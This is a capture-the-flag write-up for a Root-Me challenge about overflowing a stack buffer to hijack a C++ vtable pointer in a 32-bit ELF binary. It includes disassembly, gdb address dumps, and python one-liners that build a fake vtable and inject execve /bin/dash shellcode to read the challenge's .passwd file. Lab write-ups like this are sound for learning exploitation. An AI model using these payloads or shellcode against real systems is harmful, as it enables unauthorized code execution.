# rootme : ELF x86 - Stack buffer overflow - C++ vtables


g++ places the vtable at the end of the object.  Windows visual c++ places vtable at start of object.

In this challenge the object contains only the vtable and follows a buffer that can be overflowed, avoiding compiler differences.

    class:
        char str[80];
        formatter * m_pFormatter ;

    vtable:
        RTTI
        displayName
        format


This function accesses the object, dereferences the vtable pointer and calls the format function pointer.

    / (fcn) sym.MyStringFormatter::display 39
    |   sym.MyStringFormatter::display (int arg_8h);
    |           ; arg int arg_8h @ ebp+0x8
    |           ; var int local_4h @ esp+0x4
    
    |           0x08048a0b      8b4050         mov eax, dword [eax + 0x50]
    |           0x08048a0e      8b00           mov eax, dword [eax]
    |           0x08048a10      83c008         add eax, 8
    |           0x08048a13      8b08           mov ecx, dword [eax]
    
    |           0x08048a25      ffd1           call ecx


Buffer address:
    
    gdb$ x/1wx 0xbffffb60+0x50
    0xbffffbb0:     0x0804b008

Object address:
    
    gdb$ x/10xw 0x0804b008
    0x804b008:      0x08048bd8

Vtable address:
    
    gdb$ x/4wx 0x08048bd8
    0x8048bd8 <_ZTV14LowerFormatter+8>:     0x0804894c      0x08048956      0x0804896a


Create vtable in buffer and call into shellcode.  Easy.
    
    Buf: <junk> <junk> <buf+8> <junk> <buf+20> <shellcode> <buf+8>
                       vtable         func                  obj


Except that even after removing extra env var from gdb, the buffer address of 0xbffffb60 still wasn't correct.  Utter headache..

How do you find correct address when no core dump files available?  By using the valid addresses to get normal output.


Use correct object address:

    python -c 'print "5\n2\n" + "AAA" + "AAAA" + "BBBB" + "CCCC" + "\x90" * 60 + "\x08\xb0\x04\x08"' | ./ch20

Use correct vtable address but in buffer - I had to brute force the buffer address:

    python -c 'print "5\n2\n" + "AAA" + "\xd8\x8b\x04\x08" + "BBBB" + "CCCC" + "\x90" * 60 + "\x98\xfb\xff\xbf"' | ./ch20

Use correct function pointer but in buf+16:

    python -c 'print "5\n2\n" + "AAA" + "\x98\xfb\xff\xbf" + "BBBB" + "\x6a\x89\x04\x08" + "\x90" * 60 + "\x98\xfb\xff\xbf"' | ./ch20

Add the shellcode with command:

    (python -c 'print "5\n2\n" + "AAA" + "\x98\xfb\xff\xbf" + "BBBB" + "\xa8\xfb\xff\xbf" + "\x90" * 14 + "\xeb\x1d\x5b\x31\xd2\x89\xd9\x83\xc1\x04\x83\xc1\x05\x88\x11\x31\xc0\xb0\x0b\x31\xc9\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41" + "\x98\xfb\xff\xbf"' ; /bin/echo "cat .passwd") | ./ch20


Solved!
